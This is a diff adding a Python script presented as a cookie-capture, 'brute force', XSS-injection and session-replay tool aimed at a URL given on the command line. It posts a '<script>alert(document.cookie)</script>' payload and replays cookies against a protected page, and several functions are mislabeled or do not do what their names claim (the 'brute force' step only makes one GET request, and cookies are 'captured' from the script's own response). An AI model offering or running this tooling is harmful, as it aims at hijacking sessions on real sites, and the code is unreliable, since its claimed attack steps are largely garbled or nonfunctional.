@@ -1,0 +1,90 @@
+import sys
+import requests
+
+def simulate_cookie_capture(endpoint, captured_cookies):
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+        }
+        
+        response = requests.get(endpoint, headers=headers)
+        response.raise_for_status()
+        
+        if 'Set-Cookie' in response.headers:
+            cookie = response.headers['Set-Cookie'].split(";")[0]
+            host = response.url.split("//")[-1].split("/")[0]
+            headers["Cookie"] = cookie
+            headers["Host"] = host
+            
+            print(f"Captured cookie for endpoint {endpoint}: {cookie}")
+            print(f"Host: {host}")
+            
+            captured_cookies.append(cookie)
+        else:
+            print(f"No cookies found in response for endpoint {endpoint}")
+        
+    except requests.exceptions.RequestException as e:
+        print(f"Error getting cookies: {type(e)} - {e}")
+
+def brute_force_cookies(url, brute_force_captured_cookies):
+    try:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            print("Broken Cookie:", response.cookies)
+            brute_force_captured_cookies.extend(response.cookies)
+    except requests.exceptions.RequestException as e:
+        print(f"Error breaking cookie: {e}")
+
+def inject_malicious_code(url):
+    try:
+        malicious_code = "<script>alert(document.cookie)</script>"
+        response = requests.post(url, data=malicious_code)
+        response.raise_for_status()
+        print("Malicious code injected successfully!")
+        
+        if 'Set-Cookie' in response.headers:
+            cookie = response.headers['Set-Cookie'].split(";")[0]
+            print(f"Captured cookie via malicious code injection: {cookie}")
+            
+    except requests.exceptions.RequestException as e:
+        print(f"Error injecting malicious code: {e}")
+
+def malicious_cookie_usage(cookie):
+    try:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+        headers["Cookie"] = cookie
+        
+        response = requests.get("https://example.com/protected-page", headers=headers)
+        response.raise_for_status()
+        
+        print("Malicious cookie successfully used!")
+        print("Response:", response.text)
+        print("-" * 50)
+        
+    except requests.exceptions.RequestException as e:
+        print(f"Error using malicious cookie: {e}")
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python script_name.py [name] [link]")
+        return
+    
+    name = sys.argv[1]
+    link = sys.argv[2]
+    
+    captured_cookies = []
+    brute_force_captured_cookies = []
+    
+    simulate_cookie_capture(link, captured_cookies)
+    brute_force_cookies(link, brute_force_captured_cookies)
+    inject_malicious_code(link)
+    
+    print("Captured cookies:", captured_cookies)
+    print("Captured cookies via brute force:", brute_force_captured_cookies)
+    
+    for cookie in captured_cookies:
+        malicious_cookie_usage(cookie)
+
+if __name__ == "__main__":
+    main()
